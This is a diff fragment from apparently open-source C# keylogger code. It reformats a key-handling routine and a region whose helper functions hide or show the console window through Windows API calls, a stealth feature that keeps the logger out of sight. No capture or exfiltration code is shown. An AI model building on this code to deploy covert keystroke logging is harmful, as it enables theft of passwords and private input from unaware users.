@@ -97,30 +97,30 @@ namespace Keylogger
 
             previousKey = (Keys)vkCode;
             isHotKey = false;
-            #endregion
+        }
+        #endregion
 
-            #region windows
-            [DllImport("kernel32.dll")]
-            static extern IntPtr GetConsoleWindow();
+        #region windows
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
 
-            [DllImport("user32.dll")]
-            static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
-            const int SW_HIDE = 0;
+        const int SW_HIDE = 0;
 
-            const int SW_SHOW = 5;
+        const int SW_SHOW = 5;
 
-            static void HideWindow()
-            {
-                var console = GetConsoleWindow();
-                ShowWindow(console, SW_HIDE);
-            }
+        static void HideWindow()
+        {
+            var console = GetConsoleWindow();
+            ShowWindow(console, SW_HIDE);
+        }
 
-            static void DisplayWindow()
-            {
-                var console = GetConsoleWindow();
-                ShowWindow(console, SW_SHOW);
-            }
+        static void DisplayWindow()
+        {
+            var console = GetConsoleWindow();
+            ShowWindow(console, SW_SHOW);
         }
         #endregion
 
